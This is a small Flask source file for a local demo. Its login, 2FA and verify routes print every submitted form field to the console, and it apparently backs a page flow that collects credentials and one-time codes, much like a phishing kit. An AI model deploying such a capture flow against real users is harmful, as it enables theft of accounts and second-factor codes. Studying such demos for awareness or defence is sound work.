from flask import Flask, request, send_file, make_response

app = Flask(__name__)


@app.route("/auth", methods=["POST"])
def auth():
    print("Received data:", request.form.to_dict())  # Debugging line
    return "ok", 200  # Ensure a 200 OK response


@app.route("/")
def index():
    response = make_response(send_file("templates/index.html"))
    # Just for localhost demonstration sake
    response.headers.add("Access-Control-Allow-Origin", "*")
    return response


@app.route('/login', methods=['GET', 'POST'])
def login():
    print("Received data:", request.form.to_dict())
    return send_file("templates/2fa.html")


@app.route("/success", methods=['GET', 'POST'])
def success():
    print("Received data:", request.form.to_dict())
    return send_file("templates/verify.html")


if __name__ == "__main__":
    app.run(host='127.0.0.1', port=5000)

